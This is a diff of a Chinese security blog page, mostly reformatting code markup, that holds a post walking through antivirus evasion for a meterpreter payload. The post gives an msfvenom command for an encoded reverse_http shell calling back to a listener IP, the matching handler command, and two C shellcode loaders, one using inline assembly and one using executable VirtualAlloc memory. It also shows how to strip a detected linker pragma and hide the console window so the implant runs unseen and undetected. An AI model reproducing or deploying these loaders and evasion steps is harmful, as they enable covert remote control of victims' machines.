@@ -42,8 +42,7 @@
 	<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/live2d-widget/autoload.js"></script>
 
 <meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="Yang Hao's blog" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+</head>
 
 
 <body>
@@ -450,7 +449,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    745
+                    750
                 </div>
                 
 
@@ -470,45 +469,45 @@
                 <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。 </p>
 <h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2. shellcode生成和二进制文件编译"></a>2. shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p>
 <p>好了不说了，进入正题，首先我们使用msfvenom生成C语言shellcode:</p>
-<pre class="line-numbers language-c"><code class="language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">12</span> <span class="token operator">-</span>b <span class="token string">'\x00'</span> LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">8.102</span> LPORT<span class="token operator">=</span><span class="token number">6666</span> <span class="token operator">-</span>f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="c">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=192.168.8.102 LPORT=6666 -f c</code></pre>
 <p><img src="https://i.loli.net/2020/08/30/GCZerU1cp9gEFH2.png" alt="msfvenom"><br>然后网上找了一段C语言加载shellcode的代码。。通过内联汇编加载shellcode：</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/OPT:nowin98")</span>
-<span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")</span><span class="token comment" spellcheck="true">//不显示窗口</span>
-<span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span>
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token comment" spellcheck="true">//内联汇编</span>
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;windows.h&gt;
+#pragma comment(linker, "/OPT:nowin98")
+#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口
+unsigned char buf[] ="shellcode";
+int main(int argc,char const *argv[])
+{
+    //内联汇编
     __asm   
-    <span class="token punctuation">{</span>
-        lea eax<span class="token punctuation">,</span>buf<span class="token punctuation">;</span>   
-        call eax<span class="token punctuation">;</span>   
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    {
+        lea eax,buf;   
+        call eax;   
+    }
+}</code></pre>
 <p>话不多说，先编译上线测试，启动msf监听：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666</code></pre>
 <p> <img src="https://i.loli.net/2020/08/30/y7BndOlu3JG8PKt.png" alt="handler"><br> 另一边编译源码，生成exe:<br> <img src="https://i.loli.net/2020/08/30/oVZv6XKxrecbFAw.png" alt="Build_exe"><br> 双击执行exe,msf上线：<br> <img src="https://i.loli.net/2020/08/30/UyCWEo2DpJdAu84.png" alt="reverse_meterpreter"><br> 执行过程发现没有被拦截，看起来这已经免杀了：<br> <img src="https://i.loli.net/2020/08/30/RvXdq423TsuyhNE.png" alt="免杀成功"><br> 好的，免杀成功，本文结束。</p>
 <h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3. VS免杀测试"></a>3. VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="https://i.loli.net/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p>
 <p><img src="https://i.loli.net/2020/08/30/rjUdwQhYV7m3Tpk.png" alt="创建项目"></p>
 <p><img src="https://i.loli.net/2020/08/30/dmXu9wGJBg748rK.png" alt="复制代码编译"><br>是吧，被发现了，我们将恶意代码全部删除后编译，发现还是被杀：<br><img src="https://i.loli.net/2020/08/30/tVhmFpTIdPL9iBJ.png"><br>emmm? 怎么办啊，这都杀!? 其实有朋友应该注意到了下面这段代码，好吧 ，我是故意没删的，因为特征就是在这：</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">pragma</span> comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="c">#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") </code></pre>
 <p>接下来将这段代码删除，重新生成exe，然后进行扫描，发现成功过了杀软:<br><img src="https://i.loli.net/2020/08/30/lDvSHZB6jrOtFcU.png"></p>
 <p>vs编译的这个内联加载不能正常上线，修改下加载方法：</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span>
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>    
-<span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span>
-    <span class="token keyword">void</span><span class="token operator">*</span> exec <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">memcpy</span><span class="token punctuation">(</span>exec<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>exec<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;windows.h&gt;
+#include &lt;time.h&gt;
+int main(int argc, char const* argv[])
+{    
+unsigned char buf[] ="shellcode";
+    void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, buf, sizeof buf);
+    ((void(*)())exec)();
+    return 0;
+}</code></pre>
 <p>那么编译执行后会有个DOS窗口：<br><img src="https://i.loli.net/2020/08/30/LVk8Qa3oDpbilH9.png"></p>
 <p>这里我们<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">ShowWindow</a>函数来隐藏窗体：<br><img src="https://i.loli.net/2020/08/30/lf5rY1kmBswMRaq.png" alt="ShowWindow"><br>需要两个参数，一个是程序窗口句柄，可以通过<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> 来获得当前窗口句柄，另一个是int类型的nCmdShow，来控制窗口的状态，这里使用SW_HIDE来隐藏窗口：<br><img src="https://i.loli.net/2020/08/30/H5RLctbSJnQBorW.png" alt="nCmdShow"></p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token function">ShowWindow</span><span class="token punctuation">(</span><span class="token function">GetConsoleWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SW_HIDE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="c">ShowWindow(GetConsoleWindow(), SW_HIDE);</code></pre>
 <p>然后再编译执行和免杀测试，可以看到免杀且无窗口：<br><img src="https://i.loli.net/2020/08/30/sQ1j6vhLouC5dOb.png"></p>
 <h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/282945808">https://www.zhihu.com/question/282945808</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zac_sian/article/details/46778285">https://blog.csdn.net/zac_sian/article/details/46778285</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">https://docs.microsoft.com/en-us/windows/console/getconsolewindow</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p>
 <script>
@@ -1186,7 +1185,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">37.8k</span>&nbsp;字
+                class="white-color">38.1k</span>&nbsp;字
             
             
             
